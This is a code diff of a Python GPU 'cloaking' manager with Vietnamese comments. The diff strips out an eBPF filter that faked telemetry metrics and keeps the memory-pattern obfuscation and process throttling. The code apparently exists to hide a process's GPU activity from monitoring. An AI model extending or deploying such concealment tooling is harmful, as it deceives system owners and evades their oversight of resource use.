@@ -40,20 +40,14 @@ try:
 except ImportError:
     ctypes = None  # một số môi trường không cần MPO
 
-# Import eBPF Telemetry Filter
-try:
-    from ..ebpf.userspace.ebpf_manager import EBPFTelemetryFilter, is_ebpf_available
-    EBPF_AVAILABLE = True
-except ImportError:
-    EBPF_AVAILABLE = False
-    EBPFTelemetryFilter = None
+# eBPF support removed - module deleted
+EBPF_AVAILABLE = False
+EBPFTelemetryFilter = None
 
-# ---- helper log JSON ----
-try:
-    from ..telemetry.feature_logger import log_gpu_feature  # type: ignore
-except ImportError:  # pragma: no cover
-    def log_gpu_feature(*_args, **_kwargs):  # type: ignore
-        pass
+# ---- helper log JSON - telemetry module removed ----
+def log_gpu_feature(*_args, **_kwargs):  # type: ignore
+    """Telemetry logging functionality has been removed"""
+    pass
 
 # Import GPU cloaking logger
 try:
@@ -97,10 +91,10 @@ class GPUCloakingManager:
         self._thread: Optional[threading.Thread] = None
         self.mpo_thread: Optional[threading.Thread] = None
         
-        # eBPF Telemetry Filter
-        self.ebpf_filter: Optional[EBPFTelemetryFilter] = None
-        self.ebpf_config_path = ebpf_config_path or os.getenv('EBPF_CONFIG_PATH')
-        self.ebpf_enabled = os.getenv('ENABLE_EBPF_CLOAK', '0') == '1'
+        # eBPF Telemetry Filter - REMOVED
+        self.ebpf_filter = None
+        self.ebpf_config_path = None
+        self.ebpf_enabled = False
         
         # Cloaking strategies status
         self.strategies_status = {
@@ -194,94 +188,14 @@ class GPUCloakingManager:
 
     # ---------------- eBPF Telemetry Filter -----------------
     def _initialize_ebpf_filter(self) -> bool:
-        """Khởi tạo eBPF Telemetry Filter nếu được bật."""
-        if not self.ebpf_enabled:
-            logger.debug("eBPF Telemetry Filter bị tắt")
-            return True
-            
-        if not EBPF_AVAILABLE:
-            logger.warning("⚠️ eBPF Telemetry Filter không khả dụng - thiếu dependencies")
-            return False
-            
-        try:
-            # Đặt biến môi trường để nói với script setup sử dụng mock mode
-            # khi không có sẵn kernel headers
-            if 'EBPF_MOCK_MODE' not in os.environ:
-                kernel_version = os.uname().release
-                headers_dir = f"/lib/modules/{kernel_version}/build"
-                if not os.path.exists(headers_dir) or not os.path.exists(f"{headers_dir}/Makefile"):
-                    logger.warning(f"⚠️ Kernel headers không tìm thấy tại {headers_dir} - sử dụng mock mode")
-                    os.environ['EBPF_MOCK_MODE'] = 'true'
-            
-            # Tạo đối tượng filter
-            self.ebpf_filter = EBPFTelemetryFilter(self.ebpf_config_path)
-        except Exception as e:
-            logger.error(f"❌ Không thể khởi tạo EBPFTelemetryFilter: {e}")
-            return False
-            
-        # Kiểm tra nếu filter đã được khởi tạo đúng
-        if self.ebpf_filter is None:
-            logger.error("❌ EBPFTelemetryFilter là None")
-            return False
-        
-        # ---------------- Bắt đầu lọc với xử lý lỗi cẩn thận -----------------
-        try:
-            # Kiểm tra phương thức start_filtering tồn tại và callable
-            if not callable(getattr(self.ebpf_filter, 'start_filtering', None)):
-                logger.error("❌ start_filtering không hợp lệ hoặc không tồn tại")
-                return False
-
-            success = self.ebpf_filter.start_filtering()
-            if success:
-                logger.info("✅ eBPF Telemetry Filter đã khởi động thành công")
-                log_gpu_feature(
-                    feature="gpu_cloaking",
-                    state="enabled",
-                    parameters={"ebpf_filter": True},
-                    message="eBPF Telemetry Filter khởi động thành công",
-                )
-            else:
-                logger.warning("⚠️ eBPF Telemetry Filter đang chạy ở MOCK MODE (giả lập)")
-                log_gpu_feature(
-                    feature="gpu_cloaking",
-                    state="enabled",
-                    parameters={"ebpf_filter": "mock"},
-                    message="eBPF Telemetry Filter chạy ở chế độ MOCK",
-                )
-
-            # Đánh dấu trạng thái và trả về
-            self.strategies_status['ebpf_telemetry_filter'] = True
-            return True
-
-        except Exception as call_error:
-            logger.error(f"❌ Lỗi khi gọi start_filtering: {call_error}")
-            # Nếu lỗi liên quan NoneType/concat – chuyển sang mock mode
-            if "NoneType" in str(call_error) or "concat" in str(call_error):
-                logger.warning("⚠️ Phát hiện lỗi NoneType/concat - chuyển sang MOCK mode")
-                if hasattr(self.ebpf_filter, 'use_mock_mode'):
-                    self.ebpf_filter.use_mock_mode = True
-                self.strategies_status['ebpf_telemetry_filter'] = True
-                log_gpu_feature(
-                    feature="gpu_cloaking",
-                    state="error",
-                    parameters={"ebpf_filter": False},
-                    error_code="EBPF_ERR",
-                    message=str(call_error),
-                )
-                return True
-            return False
+        """eBPF Telemetry Filter đã được loại bỏ khỏi ứng dụng."""
+        logger.info("ℹ️ eBPF functionality has been completely removed from this application")
+        return True
     
     def _stop_ebpf_filter(self):
-        """Dừng eBPF Telemetry Filter."""
-        if self.ebpf_filter:
-            try:
-                self.ebpf_filter.stop_filtering()
-                logger.info("🛑 eBPF Telemetry Filter đã dừng")
-                self.strategies_status['ebpf_telemetry_filter'] = False
-            except Exception as e:
-                logger.error("❌ Lỗi khi dừng eBPF filter: %s", e)
-            finally:
-                self.ebpf_filter = None
+        """eBPF Telemetry Filter đã được loại bỏ khỏi ứng dụng."""
+        logger.info("ℹ️ eBPF functionality has been completely removed from this application")
+        return
 
     # ---------------- MPO (memory pattern obfuscation) -----------------
     def _run_memory_obfuscation(self):
@@ -321,10 +235,8 @@ class GPUCloakingManager:
             self.work_ms, self.sleep_ms, self.pid
         )
         
-        # Initialize eBPF filter first (kernel-level protection)
-        ebpf_success = self._initialize_ebpf_filter()
-        if self.ebpf_enabled and not ebpf_success:
-            logger.warning("⚠️ Tiếp tục mà không có eBPF filter")
+        # eBPF filter has been removed - skipping initialization
+        logger.info("ℹ️ eBPF filter has been removed from this application")
         
         # Initialize MPO if enabled
         enable_mpo = os.getenv('ENABLE_MPO', '0') == '1'
@@ -426,8 +338,7 @@ class GPUCloakingManager:
         if self._thread:
             self._thread.join(timeout=5)
         
-        # Stop eBPF filter
-        self._stop_ebpf_filter()
+        # eBPF filter has been removed - no cleanup needed
         
         # MPO thread will stop automatically (daemon thread)
         if self.mpo_thread and self.mpo_thread.is_alive():
@@ -449,19 +360,14 @@ class GPUCloakingManager:
             }
         }
         
-        # Add eBPF filter status if available
-        if self.ebpf_filter:
-            status['ebpf_status'] = self.ebpf_filter.get_status()
+        # eBPF filter has been removed
+        status['ebpf_status'] = 'removed'
         
         return status
     
     def update_fake_metrics(self, metrics: Dict[str, int]):
-        """Cập nhật fake metrics cho eBPF filter."""
-        if self.ebpf_filter:
-            self.ebpf_filter.update_fake_metrics(metrics)
-            logger.info("📊 Đã cập nhật fake metrics: %s", metrics)
-        else:
-            logger.warning("⚠️ eBPF filter không khả dụng để cập nhật metrics")
+        """eBPF filter đã được loại bỏ - không thể cập nhật metrics."""
+        logger.info("ℹ️ eBPF filter has been removed - cannot update metrics")
     
     def is_process_alive(self) -> bool:
         """Kiểm tra xem target process còn sống không."""
